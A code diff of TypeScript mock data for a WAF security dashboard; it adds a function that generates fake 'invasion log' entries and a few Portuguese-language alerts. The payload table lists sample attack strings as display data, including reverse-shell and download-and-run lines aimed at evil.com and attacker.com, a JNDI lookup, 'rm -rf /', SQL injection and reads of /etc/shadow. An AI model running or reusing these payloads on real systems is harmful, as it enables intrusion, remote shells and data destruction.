@@ -1,5 +1,49 @@
 // Vextagon mock data — production-grade simulation
 
+// Generate realistic WAF invasion logs
+function generateInvasionLogs(count: number) {
+  const types = ["SQL Injection", "XSS", "Brute Force", "DDoS", "Path Traversal", "CSRF", "RCE", "SSRF", "LFI", "Command Injection"];
+  const ips = [
+    "45.227.254.8", "103.152.220.44", "91.240.118.172", "185.220.101.33", "195.54.160.149",
+    "194.163.128.77", "179.43.175.114", "162.247.74.27", "51.222.253.18", "185.100.87.41",
+    "103.75.190.11", "45.148.10.234", "193.118.53.202", "89.248.167.131", "71.6.135.131",
+    "80.82.77.139", "94.102.49.190", "66.240.236.119", "71.6.165.200", "198.20.69.98",
+  ];
+  const payloads: Record<string, string[]> = {
+    "SQL Injection": ["' OR 1=1 --", "'; DROP TABLE users; --", "UNION SELECT * FROM credentials", "1' AND 1=CONVERT(int,@@version)--", "admin' OR '1'='1"],
+    "XSS": ["<script>document.cookie</script>", "<img onerror=alert(1) src=x>", "javascript:alert('xss')", "<svg onload=fetch('//evil.com')>", "'\"><script>steal()</script>"],
+    "Brute Force": ["admin:password123", "root:toor", "admin:admin", "user:123456", "root:root123"],
+    "DDoS": ["SYN Flood (42k pps)", "UDP Amplification (18Gbps)", "HTTP Flood (12k rps)", "DNS Amplification (8k qps)", "Slowloris (2k conn)"],
+    "Path Traversal": ["../../etc/passwd", "..\\..\\windows\\system32\\config\\sam", "....//....//etc/shadow", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "../../../var/log/auth.log"],
+    "CSRF": ["POST /api/transfer?amount=10000", "PUT /api/admin/role?role=admin", "DELETE /api/users/1", "POST /api/password/reset", "POST /api/settings/email"],
+    "RCE": ["; cat /etc/passwd", "| wget evil.com/shell.sh", "${jndi:ldap://attacker.com/a}", "{{7*7}}", "os.execute('id')"],
+    "SSRF": ["http://169.254.169.254/metadata", "http://127.0.0.1:6379/", "file:///etc/passwd", "gopher://127.0.0.1:11211/", "dict://127.0.0.1:11211/"],
+    "LFI": ["/etc/passwd%00", "php://filter/convert.base64-encode/resource=index.php", "php://input", "/proc/self/environ", "....//....//etc/passwd"],
+    "Command Injection": ["; rm -rf /", "| nc -e /bin/sh attacker.com 4444", "`whoami`", "$(cat /etc/shadow)", "&& curl evil.com/shell | bash"],
+  };
+  const actions = ["BLOCKED", "BLOCKED", "BLOCKED", "MITIGATED", "BLOCKED"];
+  const severities = ["critical", "critical", "high", "high", "medium"];
+  const countries = ["CN", "RU", "KP", "IR", "BR", "US", "DE", "NG", "PK", "VN"];
+
+  const logs = [];
+  const now = Date.now();
+  for (let i = 0; i < count; i++) {
+    const type = types[Math.floor(Math.random() * types.length)];
+    const typePayloads = payloads[type] || ["unknown payload"];
+    logs.push({
+      id: `inv${i + 1}`,
+      type,
+      ip: ips[Math.floor(Math.random() * ips.length)],
+      payload: typePayloads[Math.floor(Math.random() * typePayloads.length)],
+      action: actions[Math.floor(Math.random() * actions.length)],
+      timestamp: new Date(now - Math.random() * 86400000).toISOString().replace("T", " ").slice(0, 19),
+      severity: severities[Math.floor(Math.random() * severities.length)],
+      country: countries[Math.floor(Math.random() * countries.length)],
+    });
+  }
+  return logs.sort((a, b) => b.timestamp.localeCompare(a.timestamp));
+}
+
 export const mockWafData = {
   totalRequests: 1_284_392,
   blockedRequests: 23_847,
@@ -28,14 +72,7 @@ export const mockWafData = {
     { time: "20:00", total: 9800, blocked: 210 },
     { time: "22:00", total: 6100, blocked: 140 },
   ],
-  invasionLogs: [
-    { id: "inv1", type: "SQL Injection", ip: "192.168.1.45", payload: "' OR 1=1 --", action: "BLOCKED", timestamp: "2026-03-08 14:32:01", severity: "critical" },
-    { id: "inv2", type: "Brute Force", ip: "10.0.0.23", payload: "admin:password123", action: "BLOCKED", timestamp: "2026-03-08 14:31:48", severity: "high" },
-    { id: "inv3", type: "DDoS", ip: "203.0.113.0/24", payload: "SYN Flood (42k pps)", action: "MITIGATED", timestamp: "2026-03-08 14:30:12", severity: "critical" },
-    { id: "inv4", type: "XSS", ip: "172.16.0.8", payload: "<script>document.cookie</script>", action: "BLOCKED", timestamp: "2026-03-08 14:29:55", severity: "high" },
-    { id: "inv5", type: "Path Traversal", ip: "192.168.2.100", payload: "../../etc/passwd", action: "BLOCKED", timestamp: "2026-03-08 14:28:30", severity: "medium" },
-    { id: "inv6", type: "Brute Force", ip: "45.33.32.1", payload: "root:toor", action: "BLOCKED", timestamp: "2026-03-08 14:27:10", severity: "high" },
-  ],
+  invasionLogs: generateInvasionLogs(50),
 };
 
 export const mockScanResults = {
@@ -117,6 +154,8 @@ export const mockSecurityAlerts = [
   { id: "a2", type: "credential_leak", severity: "high", title: "Credencial vazada detectada", description: "admin@alluzion.com encontrado em breach recente", domain: "alluzion.com", timestamp: "2026-03-08 13:45:00", read: false },
   { id: "a3", type: "ssl_expiring", severity: "medium", title: "Certificado SSL expira em 30 dias", description: "Renovar antes de 2026-06-15", domain: "example.com", timestamp: "2026-03-08 12:00:00", read: true },
   { id: "a4", type: "ddos_detected", severity: "critical", title: "Ataque DDoS mitigado", description: "SYN Flood de 42k pps bloqueado pelo WAF", domain: "example.com", timestamp: "2026-03-08 14:30:00", read: false },
+  { id: "a5", type: "brute_force", severity: "high", title: "Brute Force detectado", description: "342 tentativas de login em 5 minutos no painel admin", domain: "admin.alluzion.com", timestamp: "2026-03-08 11:20:00", read: false },
+  { id: "a6", type: "server_down", severity: "critical", title: "Servidor offline", description: "srv-prod-02 não responde há 15 minutos", domain: "prod-02.alluzion.com", timestamp: "2026-03-08 10:45:00", read: true },
 ];
 
 export const mockAdminUsers = [
